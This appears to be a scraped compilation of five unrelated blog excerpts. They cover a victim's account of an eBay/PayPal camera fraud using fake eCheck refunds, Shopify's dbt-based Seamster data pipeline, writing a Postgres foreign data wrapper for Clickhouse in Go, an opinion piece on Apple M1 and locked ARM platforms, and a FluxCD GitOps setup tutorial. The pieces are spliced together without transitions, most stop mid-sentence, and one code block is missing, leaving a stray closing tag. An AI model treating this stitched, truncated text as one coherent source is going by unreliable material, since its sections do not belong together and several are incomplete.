<p>Anyway, I’ve taken this thing around the world and up mountains and gotten some <a href="https://leejo.github.io/projects/alpine_panoramics/">nice photos</a> out of it. I’d be happy to call it a day with panoramic photography, but i’m still working on a long term project with the camera that will not be complete for a few years yet. So I need a backup camera for when my current camera fails.</p>

<p>A thing of note is that these cameras are now difficult to repair because spare parts are in short supply, Hasselblad no longer service them so it’s down to third parties to do that. Some of the failures are terminal. That means purchasing the camera is risky because you could get one that is about to fail but shows no signs of doing so. It could be a “mint” condition example that hasn’t been used in fifteen years so all the internal lubricants have dried up to the point that it will fail quicker than a beaten up example that has been serviced recently.</p>

<p>So my requirements for the one I want to purchase are pretty simple: I really don’t care about the cosmetic condition as long as the shutter mechanism and film advance are in good working order and the rangefinder calibration is accurate and the electronics are functioning. I want a beat up, travelled, used, ugly camera that continues to march on because it’s proven its core functions are solid. Really I want <a href="https://www.magnumphotos.com/theory-and-practice/koudelka-shooting-holy-land-israel-palestine-documentary-conflict/">Koudelka’s</a> XPan.</p>

<p>And I found one on eBay recently that looked like a fit.</p>

<p><strong>And The Point Of This Preamble Is What Exactly?</strong></p>

<p>The camera is of sufficient niche but of high enough value to be a good vector for fraudsters. I guess you could call it ideal as it’s not going to get any take down requests - it isn’t made anymore and camera manufacturers don’t have an incentive to monitor second hand sales for fraud.</p>

<p>A mint condition body with standard lens will now sell for approx £3,000. That’s over twice what I paid for mine. An OK condition body alone might sell for £2,000 and one that’s in really bad condition or “for parts” perhaps around £1,000.</p>

<p>The eBay listing I found was from a seller with a 100% positive feedback, with more than 110 ratings, and a handful in the last 12 months. They had been registered in the UK since 2006, so this was an established account. The thing I missed: they had no feedback ratings for selling, they had only ever received feedback for buying.</p>

<p>The auction itself looked legitimate - the details of the camera were believable and the title and photos of the auction didn’t match any others when looking at recently completed eBay sales, nor could I find any matches by Googling. A red flag for auctions is if they use the same photos from other auctions or if the title/description has clearly been copied.</p>

<p>The camera looked beaten up, really beaten up. This isn’t unusual for XPan bodies - their coating is a veneer that will peel away if you’re out using the camera often enough. However this one also had a few dings and scratches indicative of it being dropped. Well that’s purely cosmetic so probably not a problem. I’ve dropped mine a couple of times already, right? The shutter count was also high, a few thousand actuations, which can also be something that puts people off.</p>

<p>The auction stated that the camera had a proven record and had been serviced recently, meaning all those cosmetic things were not worth worrying about.</p>

<p><strong>Hook, Line, …</strong></p>

<p>So I used the “Buy it now” option on the auction. The listing was just below £1,000, which seemed a little low for a working Xpan, but as I said this camera really looked beaten up. I figured a few things:</p>

<ul>
  <li>If the camera wasn’t working then I could just resell it for parts</li>
  <li>Or salvage some of the parts for my own Xpan</li>
  <li>Or PayPal would have me covered, as they offer solid buyer protection</li>
  <li>If PayPal <em>didn’t</em> have me covered then my bank would</li>
</ul>

<p>One thing to note is that this auction was a new listing when I stumbled upon it - It still had eBay’s “new listing” tag, and I knew that if I didn’t take it someone else would very quickly. So that played a part into me not spending enough time thinking about if this was a fraudulent listing or not.</p>

<p>And of course it was a fraudulent listing, I mean why wouldn’t it be right? The way this happened was as follows:</p>

<ul>
  <li>1) I used the “buy it now” option and made the payment via PayPal: Sun, 9 Feb, 12:39 (CET)</li>
  <li>2) The order was updated with a UPS tracking number: Sun, 9 Feb, 14:05</li>
  <li>3) The PayPal payment was “refunded”: Sun, 9 Feb, 14:09</li>
  <li>4) There was a delay in the “eCheck payment” (the “refund”): Tue, 11 Feb, 16:0</li>
</ul>

<p>Between 3 and 4 the original auction was deleted, I could no longer visit the listing. While I could see the item in my purchased items list the links were now leading to eBay’s “we can’t find that item” page. Most importantly the “refund” was in progress and PayPal’s communication emails during this process read like this:</p>

<ul>
  <li>“You have a refund from XXXXX” - email subject</li>
  <li>“XXXXX refunded £830.00 GBP from your purchase on 9 February 2020.” - email body</li>
  <li>“The money has been refunded to your PayPal balance” - email body</li>
  <li>“It will be made available on or around 12 February 2020.” - email body</li>
</ul>

<p>The first three sentences here are misleading - I certainly didn’t have a refund, it had not been refunded, and it wasn’t in my PayPal balance. The last sentence was the important bit that actually made it clear that the previous statements were false. I had made the original payment using my credit card, the refund should have been processed onto my credit card and not into my PayPal balance. This looked like a massive flaw in PayPal’s payment/refund process.</p>

<p>Sure enough the fraud involved sending the refund using an “eCheck” (what a ridiculous term, it’s just a bank transfer) from the compromised<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> PayPal account. So the fraudster withdrew my payment to their own account and then issued a refund by eCheck to source those funds from <em>another</em> account. Since the source of funds for the eCheck was either (now) invalid or lacked sufficient funds the “refund” process would keep trying to process the eCheck, and it would keep failing:</p>

<ul>
  <li>“You have a refund from XXXXX” - from PayPal. Sun, 9 Feb, 14:09 (CET)</li>
  <li>“Your refund didn’t complete” - Tue, 18 Feb, 14:53</li>
  <li>“Delay in eCheck payment” - Thu, 20 Feb, 16:31</li>
  <li>“Your refund didn’t complete” - Wed, 26 Feb, 16:09</li>
  <li>“You have a refund from XXXXX” - Wed, 26 Feb, 16:22</li>
  <li>“Delay in eCheck payment” - Fri, 28 Feb, 14:48</li>
  <li>“Your refund didn’t complete” - Thu, 5 Mar, 14:55</li>
  <li>“You have a refund from XXXXX” - Thu, 5 Mar, 15:21</li>
  <li>“Delay in eCheck payment” - Mon, 9 Mar, 14:31</li>
  <li>“Your refund didn’t complete” - Fri, 13 Mar, 13:31</li>
</ul>

<p>What on earth is going on here? The eCheck keeps failing, which is not surprising, but the person/thing that has taken over the account keeps issuing a new refund quickly after the previous doesn’t complete. This seems like an attempt to keep the refund process in play, and after contacting PayPal I understood why.</p>

<p><strong>Contacting PayPal</strong></p>

<p>I used PayPal’s dispute claim form to contact them on 10th Feb and have something done about the problem. I received a response on the 19th Feb saying the claim was denied because “refund previously issued”.</p>

<p>What’s interesting here is this was after the “Your refund didn’t complete” message, so clearly there is a flaw in the claims process here - I assume there is some level of automation and getting an actual human to look at the process properly would take a lot of effort.</p>

<p><strong>Contacting The Bank</strong></p>

<p>I’d already decided to bypass PayPal and go straight to my bank, where I knew it would be easy to speak to someone quickly. I did this on 11th Feb in anticipation of PayPal denying my claim because, well, that’s what they do it seems.</p>

<p>I got through to my credit card issuer quickly, spoke to their fraud/chargeback department and explained what had happen. They agreed there was clearly fraud involved so they said they would raise a chargeback. They said this would take a minimum of 15 days to allow the merchant (PayPal in this case) to respond and/or force the refund through.</p>

<p>I had to bump the claim email a couple of times, and eventually it started to move - I received the money back onto my credit card on 9th Mar. I then received an email from PayPal on 11th Mar saying that they had received a claim that they couldn’t complete because “You opened this dispute with your bank or credit card issuer, and not with us. We can’t provide additional details or updates on this claim because we don’t have access to the investigation details.”</p>

<p>So the two sides don’t really speak to one another here, despite there being a claim from me on both sides, with all the relevant transaction details and reference numbers.</p>

<p>My bank told me there was still a 45 day period after the chargeback that the merchant could dispute it, and that would prolonge the process, but as I said I heard nothing more from PayPal.</p>

<p>Clearly there are some problems here.</p>

<p><strong>Problems With The PayPal Refund Process</strong></p>

<p>A seller should not be able to refund a payment if their PayPal balance is not sufficient to cover the refund amount or their source of funds (bank/card/whatever) cannot be debited immediately. None of this “eCheck” nonsense.</p>

<p>If the balance is insufficient and the source of funds fails then any “eCheck” should only be available by them contacting PayPal support and providing a legitimate reason. In the case of an “eCheck” their …</p></div></div>

  <p><strong>By Michelle Ark and Chris Wu</strong></p>
<p>In January of 2014, Shopify built a data pipeline platform for the data science team called Starscream. Back then, we were a smaller team and needed a tool that could deal with everything from ad hoc explorations to machine learning models. We chose to build with PySpark to get the power of a generalized distributed computer platform, the backing of the industry standard, and the ability to tap into the Python talent market.&nbsp;</p>
<p>Fast forward six years and our data needs have changed. Starscream now runs 76,000 jobs and writes 300 terabytes a day! As we grew, some types of work went away, but others (like simple reports) became so commonplace we do them every day. While our Python tool based on PySpark was computationally powerful, it wasn’t optimized for these commonplace tasks. If a product manager needed a simple rollup for a new feature by country, pulling it, and modeling it wasn’t a fast task.</p>
<p>We’ll show you how we moved to a SQL modelling workflow by leveraging <a href="https://www.getdbt.com/" target="_blank" title="Analytics engineering is the data transformation work that happens between loading data into your warehouse and analyzing it. dbt allows anyone comfortable with SQL to own that workflow." rel="nofollow noopener noreferrer">dbt</a> (data build tool) and created tooling for testing and documentation on top of it. All together, these features provide Shopify’s data scientists with a robust, production-ready workflow to quickly build straightforward pipelines.</p>

<p>When we interviewed our users to understand their workflow on Starscream, there were two issues we discovered: <em>development time</em> and <em>thinking</em>.</p>
<p><em>Development time</em> encompasses the time data scientists use to prototype the data model they’d like to build, run it, see the outcome,and iterate. The PySpark platform isn’t ideal for running straightforward reporting tasks, often forcing data scientists to write boilerplate and it yields long runtimes. This led to long iteration cycles when trying to build models on unfamiliar data.</p>
<p>The second issue, <em>thinking</em>, is more subtle and deals with the way the programming language forces you to look at the data. Many of our data scientists prefer SQL to python because its structure forces consistency in business metrics. When interviewing users, we found a majority would write out a query in SQL then translate it to Python when prototyping. Unfortunately, query translation is time consuming and doesn’t add value to the pipeline.</p>
<p>To understand how widespread these problems were, we audited the jobs run and surveyed our data science team for the use cases. We found that 70% or so of the PySpark jobs on Starscream were full batch queries that didn’t require generalized computing. We viewed this as an opportunity to make a kickass optimization for a painful workflow.&nbsp;</p>

<p>Our goal was to create a SQL pipeline for reporting that enables data scientists to create simple reporting data faster, while still being production ready. After exploring a few alternatives, we felt that the dbt library came closest to our needs. Their tagline “deploy analytics code faster with software engineering practices” was <em>exactly</em> what we were looking for in a workflow. We opted to pair it with Google BigQuery as our data store and dubbed the system and its tools, Seamster.</p>
<p>We knew that any off-the-shelf system wouldn’t be one size fits all. In moving to dbt, we had to implement our own:</p>
<ul>
<li>source and model structure to modularize data model development</li>
<li>unit testing to increase the types of testable errors</li>
<li>continuous integration (CI) pipelines to provide safety and consistency guarantees.</li>
</ul>
<h2>Source Independence and Safety</h2>
<p>With dozens of data scientists making data models in a shared repository, a great user experience would</p>
<ul>
<li>maximize focus on work&nbsp;</li>
<li>minimize the impact of model changes by other data scientists.</li>
</ul>
<p>By default, dbt declares raw sources in a central <code>sources.yml</code>. This quickly became a very large file as it included the schema for each source, in addition to the source name. It creates a huge bottleneck for teams editing the same file across multiple PRs.&nbsp;</p>

<p>To mitigate the bottleneck, we leveraged the flexibility of dbt and created a top-level ‘sources’ directory to represent each raw source with its own source-formatted yaml file. This way, data scientists can parse only the source documentation that’s relevant for them and contribute to the <code>sources.yml</code> file without stepping on each other’s toes.</p>

<p><em>Base models are one-to-one interfaces to raw sources.</em></p>
<p>We also created a Base layer of models using the <a href="https://discourse.getdbt.com/t/how-we-structure-our-dbt-projects/355" target="_blank" rel="nofollow noopener noreferrer">‘</a><a href="https://discourse.getdbt.com/t/how-we-structure-our-dbt-projects/355" target="_blank" title="How we structure our dbt projects" rel="nofollow noopener noreferrer">staging’ concept from dbt</a> to implement their best practice of <a href="https://docs.getdbt.com/docs/guides/best-practices/#limit-references-to-raw-data" target="_blank" title="Limit references to raw data - dbt" rel="nofollow noopener noreferrer">limiting references to raw data</a>. Our Base models serve as a one-to-one interface to raw sources. They don’t change the grain of the raw source, but do apply renaming, recasting, or any other cleaning operation that relates to the source data collection system.&nbsp;</p>
<p>The Base layer serves to protect users from breaking changes in raw sources. Raw external sources are by definition out of the control of Seamster and can introduce breaking changes for any number of reasons at any point in time. If and when this happens, you only need to apply the fix to the Base model representing the raw source, as opposed to every individual downstream model that depends on the raw source.&nbsp;</p>
<h2>Model Ownership for Teams</h2>
<p>We knew that the tooling improvements of Seamster would be only one part of a greater data platform at Shopify. We wanted to make sure we’re providing mechanisms to support good dimensional modelling practices and support data discovery.</p>
<p>In dbt, a model is simply a .sql file. We’ve extended this definition in Seamster to define a model as a directory consisting of four files:&nbsp;</p>
<ul>
<li><code>model_name.sql</code></li>
<li><code>schema.yml</code></li>
<li><code>README.md</code></li>
<li><code>test_model_name.py</code></li>
</ul>
<p>You can further organize models into directories that indicate a data science team at Shopify like ‘finance’ or ‘marketing’.&nbsp;</p>
<p>To support a clean data warehouse we’ve also organized data models into these rough layers that differentiate between:</p>
<ul>
<li>
<strong>base</strong>: data models that are one-to-one with raw data, but cleaned, recast and renamed</li>
<li>
<strong>application-ready</strong>: data that isn’t dimensionally modelled but still transformed and clean for consumption by another tool (for example,&nbsp; training data for a machine learning algorithm)</li>
<li>
<strong>presentation</strong>: shareable and reliable data models that follow dimensional modelling best practices and can be used by data scientists across different domains.</li>
</ul>
<p>With these two changes, a data consumer can quickly understand the data quality they can expect from a model and find the owner in case there is an issue. We also pass this metadata upstream to <a href="https://shopify.engineering/solving-data-discovery-challenges-shopify" target="_blank" title="How We’re Solving Data Discovery Challenges at Shopify" rel="nofollow noopener noreferrer">other tools</a> to help with the data discovery workflow.</p>
<h2>More Tests</h2>
<p>dbt has native support for ‘schema tests’, which are encoded in a model’s schema.yml file. These tests run against production data to validate data invariants, such as the presence of null values or the uniqueness of a particular key. This feature in dbt serves its purpose well, but we also want to enable data scientists to write unit tests for models that run against fixed input data (as opposed to production data).</p>
<p>Testing on fixed inputs allows the user to test edge cases that may not be in production yet. In larger organizations, there can and will be frequent updates and many collaborators for a single model. Unit tests give users confidence that the changes they’re making won’t break existing behaviour or introduce regressions.&nbsp;</p>
<p>Seamster provides a Python-based unit testing framework. Data scientists write their unit tests in the <code>test_model_name.py</code> file in the model directory. The framework enables constructing ‘mock’ input models from fixed data. The central object in this framework is a ‘mock’ data model, which has an underlying representation of a Pandas dataframe. You can pass fixed data to the mock constructor as either a csv-style string, Pandas dataframe, or a list of dictionaries to specify input data.&nbsp;</p>
<p><img alt="Input and expected MockModels are built from static data. The actual MockModel is built from input MockModels by BigQuery. Actual and expected MockModels can assert equality or any Great Expectations expectation" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/input-expected-mock-models.jpg?v=1605811967" src="https://cdn.shopify.com/s/files/1/0779/4361/files/input-expected-mock-models.jpg?v=1605811967"><br><em>Input and expected MockModels are built from static data. The actual MockModel is built from input MockModels by BigQuery. Actual and expected MockModels can assert equality or any Great Expectations expectation.</em></p>
<p>A constructor creates a test query where a common table expression (CTE) represents each input mock data model, and any references to production models (identified using dbt’s ‘ref’ macro) are replaced by references to the corresponding CTE. Once you execute a query, you can compare the output to an expected result. In addition to an equality assertion, we extended our framework to support all expectations from the open-source <a href="https://github.com/great-expectations/great_expectations" target="_blank" title="Great Expectations - Always know what to expect from your data." rel="nofollow noopener noreferrer">Great Expectations</a> library to provide more granular assertions and error messaging.&nbsp;</p>
<p>The main downside to this framework is that it requires a roundtrip to the query engine to construct the test data model given a set of inputs. Even though the query itself is lightweight and processes only a handful of rows, these roundtrips to the engine add up. It becomes costly to run an entire test suite on each local or CI run. To solve this, we introduced tooling both in development and CI to run the minimal set of tests that could potentially break given the change. This was straightforward to implement with accuracy because of dbt’s lineage tracking support; we simply had to find all downstream models (direct and indirect) for each changed model and run their tests.&nbsp;</p>
<h2>Schema and Directed Acyclic Graph Validation on the Cheap</h2>
<p>Our objective in Seamster’s CI is to give data scientists peace of mind that their changes won’t introduce production errors the next time the warehouse is built. They shouldn’t have to wonder whether removing a column will cause downstream dependencies to break, or whether they made a small typo in their SQL model definition.</p>
<p>To achieve this accurately, we would need to build and tear down the entire warehouse on every commit. This isn’t feasible from both a time and cost perspective. Instead, on every commit we materialize every model as a view in a temporary BigQuery dataset which is created at the start of the validation process and removed as soon as the validation finishes. If we can’t build a view because its upstream model doesn’t provide a certain column, or if the SQL is invalid for any reason, BigQuery fails to build the view and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				

<p><a href="https://www.postgresql.org/">Postgres</a>(hereinafter mentioned as PG) is a pretty cool database with lots of nice features, one of them little known ones is the ability of having Foreign data wrappers <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">(hereinafter mentioned as FDWs)</a>.</p>

<p><a href="https://clickhouse.tech/">Clickhouse</a>(hereinafter mentioned as CH) is another amazing database with an altogether different set of features targeted for OLAP use cases.</p>

<h2 id="what-are-foreign-data-wrappers-fdws-then">What are Foreign Data Wrappers (FDWs) then?</h2>

<p>Well unlike so many names in tech, we can actually infer some idea from the name itself in this case.
So FDWs in essence, allows to access <em>foreign</em> <em>data</em> sources inside Postgres(PG) via a set of <a href="https://www.postgresql.org/docs/current/fdwhandler.html">wrapper APIs</a>.</p>

<p>That is, you can access data sitting in a Mysql/SQlite/Clickhouse(<em>any other data source</em>) table inside PG as you would do for a normal PG table. Isn’t that amazing!</p>

<p>There are already numerous such FDWs. A list is available <a href="https://wiki.postgresql.org/wiki/Foreign_data_wrappers">here</a>.</p>

<p>One caveat is that the extent of features you can expect from a FDW is dependent on the particular implementation.
We can expect normal read support but other niceties like push-down filters, aggregations or joins, or write support can be missing.</p>

<h2 id="accessing-clickhouse-ch-via-postgres-pg">Accessing Clickhouse(CH) via Postgres(PG)</h2>

<p>Given the existence of so many possibilities of accessing other datastores, wouldn’t it be fun if we could access Clickhouse from inside Postgres.</p>

<p>Why would you want to do it! you may ask.</p>

<p>Well one reason could be of course, for <em>fun</em>.</p>

<p>But more realistically, one of the ambitious use cases at <a href="https://messagebird.com/">MessageBird</a>(my employer) was the ability to connect Clickhouse to <a href="https://looker.com/">Looker</a> as no direct integration existed at that time.
It was a bit of a moonshot but we decided to give it a try to see if it would work :)</p>

<p>MessageBird has generously made the full source for our experiment open source! The repository is available <a href="https://github.com/messagebird/clickhouse-postgres-fdw">here</a>.
So you can reference the ideas mentioned in the blog post directly in the code as well :)</p>

<h3 id="now-on-to-writing-one-fdw">Now on to writing one FDW!</h3>

<p>There are already <a href="https://www.postgresql.org/docs/current/fdwhandler.html">documentations</a> on how we should approach this and some simple examples are also available on Github. Most of the full fledged FDWs have their code in open so we can consult them as well.
Note that most of them are written in C becauses the FDW API of PG is in C, which makes sense.
I should highlight one particular <a href="https://github.com/pgspider/sqlite_fdw">FDW</a> that is made for SQLite and has a solid feature set, which helped me a lot while writing the one for Clickhouse.</p>

<p>But what if we want to be adventurous and write one in Go? Well, it should be possible given the existence of <a href="https://golang.org/cmd/cgo/">CGo</a>.</p>

<p>We can expect that it will not be at all trivial. ;)
There are already attempts on making Postgres Extensions in <a href="https://github.com/liztio/k8s-fdw">Go</a>, which gives a very valuable insight.</p>

<h4 id="setting-up-the-build-process-and-interaction-between-go-and-postgres-c-api">Setting up the build process and interaction between Go and Postgres C API</h4>

<p>First we should familiarize ourselves with the <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PG Extension Build Infrastructure/PGXS</a> and how to write <a href="https://www.postgresql.org/docs/current/xfunc-c.html#DFUNC">C code</a> for PG.
These are crucial as we would want to integrate the C code with Go, and knowing how the build process works should help us in understanding where our code will fit.</p>

<p>For writing a FDW we have to provide an entry point in form of a <code>struct</code> containing function pointers to the implemented callback functions.
Since we want to write those callback in Go, we can consult documentation for <a href="https://golang.org/cmd/cgo/#hdr-C_references_to_Go">accessing Go functions in C</a>, which says there are specific annotations that should allow us to export go functions outside to the C code.
All the important work is done in these callbacks only.<br>
Now it should be possible to add functions that PG FDW API expects via Go.</p>

<p>But, how will the C code find the callback functions written in Go land ? <a href="https://golang.org/cmd/go/#hdr-Build_modes">Go build modes</a> is the answer.
Directly referencing from the documentation, the <code>-buildmode=c-archive</code> allows us to:</p>

<pre><code>Build the listed main package, plus all packages it imports,
into a C archive file. The only callable symbols will be those
functions exported using a cgo //export comment. Requires
exactly one main package to be listed.
</code></pre>

<p>Perfect! Now, the exported Go functions are available in the <a href="https://linux.die.net/man/1/ar">archive file</a>.
The only remaining thing is to link the archive with C code during build.
Thankfully, <a href="https://www.postgresql.org/docs/13/extend-pgxs.html">PGXS</a> provides a <code>Make</code> variable <code>SHLIB_LINK</code> that can be used to set the shared library used. So we’ll use that flag to provide the archive build from Go source files.</p>

<p>You can see it in action <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/Makefile">here</a>.</p>

<!-- * how linking go code to c via statically linked libraries works ? .a files linking with Go. -->

<!-- And we want a library of sorts which should be callable inside C code. For this we can use go build mode (c-archive), this will create a statically linked archive(see difference btwn shared objects and statically linked libraries and how to build them) -->

<h4 id="understanding-inner-working-of-the-fdw-api-and-their-relation-with-different-query-stages">Understanding inner working of the FDW API and their relation with different Query Stages</h4>

<!-- * Figuring out which stages do what, what do you want and where to look for them -->

<p>To actually write a working FDW, we need to familiarize with the different stages a query goes through in PG and how the API functions play them out.
Postgres has an excellent documentation and moreover since all the <a href="https://github.com/messagebird/clickhouse-postgres-fdw/">source code</a> is open, we can just navigate through the code as well!</p>

<p>It would take more space than a blog post to explain the full internals of Query planner in Postgres and I probably can’t describe it well enough.
So, I suggest to go through <a href="https://www.postgresql.org/docs/current/fdw-callbacks.html">the official documentation</a> which is quite excellent and there are many other excellent references on the web.</p>

<p>I’ll try to briefly explain the flow of the API functions for the context of this post.
A very basic plan looks like this:</p>

</code></pre>

<p>There are other functions in the FDW API that I’ve omitted here (like <code>ReScanForeignScan</code>, <code>AnalyzeForeignTable</code>, <code>GetForeignUpperPaths</code>) but a basic FDW can be done with these.
Also note that this path is only concerned with the read queries. To enable writing on the foreign database, there are separate functions that need to be implemented.
You can see how the read path is implemented for our clickhouse FDW <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/main/ch_fdw.c">here</a>.</p>

<p>Important ones to take note of to properly implement the read path of a query are:</p>

<ul>
<li><p>GetForeignRelSize: It should be used to determine the estimated number of rows to be scanned on the foreign server. However, it is also used to extract the restriction clauses present in the query presented by PG and to pass them to the foreign server if it can support them.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L180">example</a>.</p></li>

<li><p>GetForeignPlan: It should return the planner node(a data structure that contains the query plan). However, it is also used to extract the target columns that can be fetched from remote/foreign servers and pass that info along with restriction clauses, table names to the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L275">example</a>.</p></li>

<li><p>BeginForeignScan: It should perform the initalization that is needed to perform the scan on the foreign server, for example: initialize the foreign DB connection, formalize the query running on foreign server and init the state with row iterator to be used in the next stage.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L508">example</a>.</p></li>

<li><p>IterateForeignScan: It should return a row from the foreign server converted to the PG specific structure. This function should convert the foreign server specific data types to PG column data types.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L620">example</a>.</p></li>

<li><p>EndForeignScan: It should clean the state being stored for the query, like row iterators, db connections should be closed.
See this <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go#L760">example</a>.</p></li>
</ul>

<p>This is a very dense overview of the functionality of a <em>basic</em> FDW. It usually helps to look around the other FDWs that are open source to look for ideas of a sample implementation. But it can differ since the foreign server can be of various types.
Usually, if we take databases that support some dialect of SQL then the hardest things are usually figuring out if the restriction clauses are remote safe, which can involve parsing the full expression clauses and then converting them to remote variants.
Converting the foreign server datatypes to PG types is comparatively easy but is very toiling.</p>

<p>You can look into how <a href="https://github.com/messagebird/clickhouse-postgres-fdw/blob/a938204f1a5645cd71dd473b5d0e5f56d2a6f831/ch_fdw.go">clickhouse FDW</a> does this to get an idea, but beware that it could be bug prone, since it hasn’t been tested thoroughly.</p>

<p>I’ll also suggest getting an idea of commonly used PG datatypes and conventions like <code>OID</code>, <code>Tuple</code>, <code>RelOptInfo</code> or just going over <a href="https://doxygen.postgresql.org/relation_8h.html"><code>relation.h</code></a> reference from PG source code.</p>

<h3 id="few-tips-and-tricks">Few Tips and Tricks</h3>

<p>These are some ideas that I’ve seen are fairly used while developing a FDW. Some can help in easy interop between Go and C, whether it is a good idea or not, is up for debate ;)</p>

<h4 id="interfacing-c-macros-within-go">Interfacing C macros within Go</h4>

<p>There are a lot of internal macros in PG source which makes it easier to access system cache, lists, heap tuples etc. which aren’t directly callable from Go’s userland.<br>
This is because CGo doesn’t quite allow directly calling C <code>#define</code> macros.<br>
You can try to simulate the same behaviour using underlying constructs but that can get hairy and cumbersome. Instead one <em>easy</em> idea is to define simple C wrapper functions like</p>

<pre><code>void *wrapper_access_list(void *list, int index){
	return access_list(list, index);
}
</code></pre>

<p>This can now be used directly on Go side. But make sure you cast the results to proper types.</p>

<h4 id="moving-out-c-code">Moving out C code</h4>

<p>There can be a point where writing C code directly in Go source files is not feasible …</p></div></div>

            <div>
                
                <p>New Apple M1 based computers are getting reviewed by hardware websites. There is no doubt: it is a big slap in the face of their venerable x86 competitors in terms of performance and efficiency.</p>
<h3>A revolution</h3>
<p>Is it the beginning of a new era in which our smartphones and personal computers would use the same <a href="https://www.ezvan.fr/en/futur-arm.html">ARM</a> technology, which has powered smartphones since their beginnings?</p>
<p>Smartphones have taken over our world. They are everywhere, and required by more and more operations : validating banking transactions, payments, private and public transportation, etc.</p>
<p>It is a bigger revolution than the personal computer, which brought Internet and computing to mostly everybody.</p>
<h3>History repeats</h3>
<p>However there is a major difference in how they get there to what happened with personal computers.</p>
<p>At their beginnings many companies, such as Amiga, Apple or Atari, were competing with different operating systems and processor architectures. Platforms were not compatible with each other, you couldn't run an Amstrad program on an Apple computer. Then the PC platform started to take off.</p>
<p>PC strength was that it is an open platform. An operating system and its software, running on a given PC compatible computer, would run on any other PC computer. Today the majority of personal computers are PC compatible, with the big exception of Apple hardware.</p>
<p>This enabled the success of Windows and then Linux. Other less common PC systems are able to run on wide range of PC computers, such as various Unix and BSDs.</p>
<h3>A closed world...</h3>
<p>ARM is a different world in which there is no platform definition. It is difficult if not impossible to run an Iphone's system on an Android phone, or vice versa. It is even difficult to run a Samsung phone system on another brand's phone, even if both are Android based.</p>
<p>This makes it very challenging to build alternative smartphone operating systems. Projects such as <a href="https://lineageos.org/">LineageOS</a> are trying to provide alternatives to the manufacturer ones, but they require a large porting work for each device.</p>
<p>As well initiatives such as <a href="https://postmarketos.org/">postmarketOS</a>, which allows running a real Linux system on a smartphone exist, but the porting challenge is so huge that only a handful of devices are supported.</p>
<h3>For a locked future ?</h3>
<p>Apple went down the same road with its Macbooks, providing hardware and software in an integrated platform. Installing something else than MacOS on a recent Macbook is possible, but requires a lot of effort.</p>
<p>Iphones are completely locked. You can't install any other system on them. There is even no way you can install apps which are not approved by Apple on an Iphone. Will Apple take advantage of the ARM transition on its Macbooks to impose the same restrictions?</p>
<p>If it does, will we trade the freedom of running the software we want with much better performance and efficiency? Will the fully locked down smartphone model overtake the open PC platform one?</p>
<p>Will we allow only fully locked systems become essential tools of our lives?</p>

		<p>As seen in <a href="https://alicegg.tech/2020/08/03/k3s.html">my previous article</a>,
after successfully setting up a Kubernetes Cluster you can install applications on it using the Helm CLI.
This is convenient to get started but might not scale well with multiple people administering the cluster.</p>

<p>To make collaboration easier and avoid making mistakes by simply mistyping Helm commands,
it is recommended to adopt a GitOps workflow.
This consists of using Git to version control the state of the cluster.
In this article, I will explain how to use FluxCD to achieve this.</p>

<p>First of all, make sure you have a running Kubernetes cluster and have installed kubectl and helm.
Then you will need to create a Git repository at your favorite provider (GitHub, Bitbucket, etc…).
Once this is done, clone it locally and create a <code>releases</code> folder inside of it.
This folder will contain the files defining your Helm releases (a release is an instance of a chart running on a cluster).</p>

<p>Let’s start by creating a release for my favorite IRC client, <a href="https://thelounge.chat/">The Lounge</a>.
To do this, create a file in <code>releases/thelounge.yaml</code> containing the following data:</p>

<div><div><pre><code><span>---</span>
<span>apiVersion</span><span>:</span> <span>helm.fluxcd.io/v1</span>
<span>kind</span><span>:</span> <span>HelmRelease</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>thelounge</span>
  <span>namespace</span><span>:</span> <span>default</span>
  <span>annotations</span><span>:</span>
    <span>fluxcd.io/automated</span><span>:</span> <span>"</span><span>false"</span>
    <span>fluxcd.io/tag.chart-image</span><span>:</span> <span>semver:~4.0</span>
<span>spec</span><span>:</span>
  <span>releaseName</span><span>:</span> <span>thelounge</span>
  <span>chart</span><span>:</span>
    <span>repository</span><span>:</span> <span>https://halkeye.github.io/helm-charts/</span>
    <span>name</span><span>:</span> <span>thelounge</span>
    <span>version</span><span>:</span> <span>4.3.0</span>
  <span>values</span><span>:</span>
    <span>ingress</span><span>:</span>
      <span>enabled</span><span>:</span> <span>true</span>
      <span>hosts</span><span>:</span>
        <span>-</span> <span>YOUR.OWN.DOMAIN</span>
</code></pre></div></div>

<p>This will be using the chart available on <a href="https://artifacthub.io/packages/helm/halkeye/thelounge">Artifact Hub</a>,
and the software will be running on the default namespace, and we ask for an <a href="https://kubernetes.io/docs/concepts/services-networking/ingress/">ingress</a> to be created.
Don’t forget to commit and push the release!</p>

<p>After creating this repository, you should install FluxCD on your cluster.
To do this simply run the following commands:</p>

<div><div><pre><code>helm repo add fluxcd https://charts.fluxcd.io

kubectl apply <span>-f</span> https://raw.githubusercontent.com/fluxcd/helm-operator/master/deploy/crds.yaml

kubectl create ns flux

helm upgrade <span>-i</span> flux fluxcd/flux <span>\</span>
   <span>--set</span> git.url<span>=</span>git@github.com:[USERNAME]/[REPO] <span>\</span>
   <span>--set</span> git.branch<span>=[</span>BRANCH] <span>\</span>
   <span>--namespace</span> flux

helm upgrade <span>-i</span> helm-operator fluxcd/helm-operator <span>\</span>
  <span>--set</span> git.ssh.secretName<span>=</span>flux-git-deploy <span>\</span>
  <span>--set</span> helm.versions<span>=</span>v3 <span>\</span>
  <span>--namespace</span> flux
</code></pre></div></div>

<p>You should now see 3 pods running in the flux namespace:</p>
